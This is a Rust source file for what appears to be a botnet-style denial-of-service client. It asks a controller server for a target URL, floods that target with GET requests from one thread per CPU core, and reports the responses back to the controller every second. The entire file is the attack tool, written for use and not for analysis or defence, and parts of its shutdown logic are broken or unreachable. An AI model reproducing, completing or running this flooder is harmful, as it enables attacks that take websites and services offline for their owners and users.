use serde_json;
use std::sync::{Arc, Mutex, Condvar};
use std::sync::mpsc::{self, Sender, TryRecvError};
use std::time;
use dashmap::DashMap;

//client struct
struct Client {
    host_address: String,
    address: Option<String>,
    attacking: bool,
    workers: Vec<Arc<(Mutex<Worker>, Condvar)>>,
    worker_threads: Vec<std::thread::JoinHandle<()>>,
    results: Arc<DashMap<u32, Vec<String>>>,
    thread_count: usize,
    stopper: Sender<()>,
}

//worker struct
struct Worker {
    id: u32,
    host_address: String,
    attacking: bool,
    address: Option<String>,
    client: reqwest::blocking::Client,
    results: Arc<DashMap<u32, Vec<String>>>,
}

//worker methods
impl Worker {
    fn new(addr: Option<String>, host: String, map: Arc<DashMap<u32, Vec<String>>>, id: u32) -> Worker {
        let client = reqwest::blocking::Client::new();
        let mut add = host.clone();
        add.push_str("/attack_info");
        Worker { host_address: add, attacking: false, address: addr, client, results: map, id }
    }

    fn start_requesting(&self) -> i32 {
        if self.attacking {
            if let Some(to_attack) = &self.address {
                let result = self.client.get(to_attack).send();
                match result {
                    Ok(res) => {
                        let code = res.status().as_u16().to_string();
                        let body = res.text().unwrap_or_default();
                        let response_body = serde_json::json!({"code": code, "body":body});
                        let local_instance = self.results.clone();
                        local_instance.entry(self.id).or_insert_with(Vec::new).push(response_body.to_string());
                        0
                    }
                    Err(_) => 1,
                }
            } else {
                1
            }
        } else {
            1
        }
    }
}

//client methods
impl Client {
    fn new(host: String) -> Client {
        let thread_count = std::thread::available_parallelism().unwrap().get();
        let (tx, _) = mpsc::channel();
        let mut cl = Client {
            host_address: host,
            address: None,
            attacking: false,
            workers: vec![],
            worker_threads: vec![],
            results: Arc::new(DashMap::with_capacity(thread_count)),
            thread_count,
            stopper: tx,
        };

        cl.worker_threads.reserve(thread_count);
        for i in 0..thread_count {
            cl.results.entry(i as u32).or_insert_with(Vec::new);
            cl.workers.push(Arc::new((
                Mutex::new(Worker::new(cl.address.clone(), cl.host_address.clone(), cl.results.clone(), i as u32)),
                Condvar::new()
            )));
        }
        cl
    }

    fn can_attack(&mut self) {
        let url = self.host_address.as_str();
        let req = reqwest::blocking::get(format!("{}/api/attack", url)).ok()
            .and_then(|res| res.json::<String>().ok())
            .and_then(|json| {
                let s = json.strip_prefix("{\"").and_then(|s| s.strip_suffix("\"}")).unwrap_or_default();
                s.split("\":\"").nth(1).map(|s| s.to_string())
            });

        self.address = req.clone();
        self.attacking = req.is_some();
        for el in &self.workers {
            let clone_el = el.clone();
            let (mx, _) = &*clone_el;
            if let Ok(mut worker) = mx.lock() {
                worker.address = req.clone();
                worker.attacking = self.attacking;
            }
        }
    }

    fn thread_worker(worker: Arc<(Mutex<Worker>, Condvar)>, stopper: mpsc::Receiver<()>) {
        let el = worker.clone();
        let (elem, cv) = &*el;
        loop {
            match stopper.try_recv() {
                Ok(_) | Err(TryRecvError::Disconnected) => {
                    println!("Stopping worker...");
                    break;
                }
                Err(TryRecvError::Empty) => {}
            }
            let mut w = elem.lock().unwrap();
            if !w.attacking {
                w = cv.wait_while(w, |w| !w.attacking).unwrap();
            }
            drop(w);
            std::thread::sleep(time::Duration::from_nanos(1));
            let w = elem.lock().unwrap();
            let mut _r = 0;
            for _ in 0..100 {
                _r = w.start_requesting();
            }
        }
    }

    fn run(mut self) {
        for i in 0..self.thread_count {
            let ind = i;
            let worker = self.workers[ind].clone();
            let (_, rx) = mpsc::channel();
            self.stopper = mpsc::Sender::clone(&self.stopper);

            self.worker_threads.push(std::thread::spawn(move || {
                Client::thread_worker(worker, rx);
            }));
        }

        self.can_attack();

        let addr = self.host_address.clone();
        let armap = self.results.clone();
        let handl = std::thread::spawn(move || {
            let time = time::Duration::from_millis(950);
            let cl = reqwest::blocking::Client::new();
            let map = &*armap;
            loop {
                std::thread::sleep(time);
                let mut request_body_vec = Vec::new();
                for el in map.iter() {
                    request_body_vec.extend(el.value().to_owned());
                }
                println!("Throughput: {}", request_body_vec.len());
                if request_body_vec.len() >= 20 {
                    cl.post(format!("{}/attack_info", addr)).json(&request_body_vec).send().unwrap_or_else(|_| ());
                    map.alter_all(|_, mut v| {
                        v.clear();
                        v
                    });
                }
            }
        });
        loop {
            self.can_attack();
        }

        handl.join().unwrap();
        while self.worker_threads.len() > 0 {
            let thread = self.worker_threads.pop().unwrap();
            thread.join().unwrap();
        }
    }

    fn stop(self) {
        for _ in &self.worker_threads {
            self.stopper.send(()).unwrap_or_else(|_| ());
        }
    }
}

#[no_mangle]
pub extern "C" fn main() {
    let mut cl = Client::new(String::from("http://localhost:8080"));
    cl.run();
}
